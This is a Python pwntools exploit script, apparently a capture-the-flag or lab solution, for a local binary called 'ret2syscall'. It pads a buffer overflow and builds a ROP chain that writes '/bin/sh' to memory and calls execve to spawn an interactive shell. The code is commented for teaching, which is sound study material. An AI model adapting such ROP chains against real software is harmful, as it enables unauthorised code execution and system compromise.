from pwn import *

# the binary is a 64-bit little-endian ELF
context.update(arch='amd64', endian='little', os='linux')

p = process('./ret2syscall')       # Spawn process
p.recvuntil(b'shell!\n')           # Wait until 'shell!' is on stdout

offset = 120                       # Offset to the return address
syscall = 0x4012d3                 # syscall        
pop_rdi = 0x40191a                 # pop rdi; ret;
pop_rax = 0x44a017                 # pop rax; ret;
pop_rdx = 0x40181f                 # pop rdx; ret;
pop_rsi = 0x40f4be                 # pop rsi; ret;
ret = 0x40101a                     # ret;
bss = 0x4c0000                     # writeable memory location
mov_rdi_rsi = 0x446a3f             # mov qword ptr [rdi], rsi; ret;

ropchain = b'A' * offset

# writing the /bin/sh string into writable memory
ropchain += p64(pop_rsi)
ropchain += b'/bin/sh\x00'
ropchain += p64(pop_rdi)
ropchain += p64(bss)
ropchain += p64(mov_rdi_rsi)

# call to execve("/bin/sh", 0, 0)
# rdi, rsi, rdx are the first 3 arguments
# rdi already points to the memory location with /bin/sh string
# rsi and rdx will now be assigned 0
# syscall code for execve is 0x3b
ropchain += p64(pop_rsi)
ropchain += p64(0x0)
ropchain += p64(pop_rdx)
ropchain += p64(0x0)
ropchain += p64(pop_rax)
ropchain += p64(0x3b)
ropchain += p64(syscall)
ropchain += p64(ret)

# saving the payload for direct use
# cat payload | ./ret2syscall
with open('payload', 'wb+') as fp:
	fp.write(ropchain)

p.sendline(ropchain)

# bash has been opened and can be interacted with
p.interactive()
